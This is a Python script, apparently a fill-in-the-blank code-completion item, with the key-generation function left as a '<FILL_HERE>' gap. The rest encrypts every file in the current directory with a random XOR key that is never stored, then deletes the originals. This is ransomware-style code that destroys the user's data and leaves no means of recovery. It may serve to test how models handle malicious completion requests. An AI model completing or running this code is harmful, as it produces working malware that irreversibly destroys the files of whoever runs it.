import os
import random

def generate_key(file_size):
    <FILL_HERE>
def encrypt_file(input_file, output_file, key):
    """
    Encrypts the contents of the input file using a XOR operation with the provided key.
    :param input_file: Path to the input file to be encrypted.
    :param output_file: Path to the output file where the encrypted content will be saved.
    :param key: The encryption key.
    """
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        while True:
            chunk = f_in.read(1)
            if not chunk:
                break
            encrypted_byte = bytes([chunk[0] ^ key.pop(0)])
            f_out.write(encrypted_byte)

def process_files_in_directory(directory):
    """
    Traverses the files in the specified directory, encrypts each file, saves the encrypted file,
    and then deletes the original file.
    :param directory: The directory containing the files to be encrypted.
    """
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            key = generate_key(file_size)
            encrypted_file_path = file_path + '.encrypted'
            encrypt_file(file_path, encrypted_file_path, key)
            os.remove(file_path)
            print(f"Encrypted and replaced {filename} with {encrypted_file_path}")

if __name__ == "__main__":
    current_directory = os.getcwd()
    process_files_in_directory(current_directory)